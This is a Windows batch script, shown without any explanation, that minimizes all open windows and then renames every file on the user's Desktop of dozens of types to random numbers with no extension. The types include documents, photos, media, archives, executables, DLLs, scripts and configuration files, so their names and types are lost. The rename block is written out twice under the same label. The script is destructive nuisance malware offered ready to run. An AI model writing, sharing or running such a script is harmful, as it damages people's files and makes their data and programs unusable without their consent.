@echo off
powershell -command "(New-Object -ComObject Shell.Application).MinimizeAll()"
cd %USERPROFILE%\desktop
:a
ren *.txt %random%
ren *.doc %random%
ren *.docx %random%
ren *.pdf %random%
ren *.rtf %random%
ren *.odt %random%
ren *.xls %random%
ren *.xlsx %random%
ren *.csv %random%
ren *.ppt %random%
ren *.pptx %random%

ren *.jpg %random%
ren *.jpeg %random%
ren *.png %random%
ren *.gif %random%
ren *.bmp %random%
ren *.tiff %random%
ren *.webp %random%
ren *.ico %random%

ren *.mp3 %random%
ren *.wav %random%
ren *.flac %random%
ren *.aac %random%
ren *.ogg %random%
ren *.mp4 %random%
ren *.mkv %random%
ren *.avi %random%
ren *.mov %random%
ren *.wmv %random%

ren *.zip %random%
ren *.rar %random%
ren *.7z %random%
ren *.tar %random%
ren *.gz %random%

ren *.exe %random%
ren *.msi %random%
ren *.dll %random%
ren *.sys %random%
ren *.iso %random%
ren *.img %random%

ren *.html %random%
ren *.htm %random%
ren *.css %random%
ren *.js %random%
ren *.json %random%
ren *.xml %random%
ren *.php %random%
ren *.py %random%
ren *.java %random%
ren *.cpp %random%
ren *.c %random%
ren *.cs %random%


ren *.cmd %random%
ren *.ps1 %random%
ren *.vbs %random%

ren *.ini %random%
ren *.cfg %random%
ren *.log %random%
ren *.tmp %random%
:a
ren *.txt %random%
ren *.doc %random%
ren *.docx %random%
ren *.pdf %random%
ren *.rtf %random%
ren *.odt %random%
ren *.xls %random%
ren *.xlsx %random%
ren *.csv %random%
ren *.ppt %random%
ren *.pptx %random%

ren *.jpg %random%
ren *.jpeg %random%
ren *.png %random%
ren *.gif %random%
ren *.bmp %random%
ren *.tiff %random%
ren *.webp %random%
ren *.ico %random%

ren *.mp3 %random%
ren *.wav %random%
ren *.flac %random%
ren *.aac %random%
ren *.ogg %random%
ren *.mp4 %random%
ren *.mkv %random%
ren *.avi %random%
ren *.mov %random%
ren *.wmv %random%

ren *.zip %random%
ren *.rar %random%
ren *.7z %random%
ren *.tar %random%
ren *.gz %random%

ren *.exe %random%
ren *.msi %random%
ren *.dll %random%
ren *.sys %random%
ren *.iso %random%
ren *.img %random%

ren *.html %random%
ren *.htm %random%
ren *.css %random%
ren *.js %random%
ren *.json %random%
ren *.xml %random%
ren *.php %random%
ren *.py %random%
ren *.java %random%
ren *.cpp %random%
ren *.c %random%
ren *.cs %random%


ren *.cmd %random%
ren *.ps1 %random%

ren *.ini %random%
ren *.cfg %random%
ren *.log %random%
ren *.tmp %random%


